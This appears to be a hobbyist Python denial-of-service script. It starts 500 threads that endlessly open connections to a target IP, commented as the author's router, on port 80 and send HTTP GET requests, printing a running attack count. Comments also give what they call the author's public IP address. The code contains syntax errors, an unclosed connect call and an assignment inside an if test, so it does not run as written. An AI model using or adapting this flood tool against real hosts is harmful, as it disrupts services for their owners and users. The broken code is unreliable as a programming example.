import socket
import threading

#Target is my router's IP address
target = '192.168.1.219'

#My Public IP address
ip = '68.105.37.10'

#Port 80 targets HTTP
#This link lists other ports to target:
#https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
port = 80

#Counter for number of requests made
attackNum = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)

        #Sends HTTP Requests
        if(port = 80):
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attackNum
        attackNum += 1
        print(attackNum)

        s.close()

#Limits number of requests made           
for i in range(500):
    thread = threading.Thread(target = attack)
    thread.start()
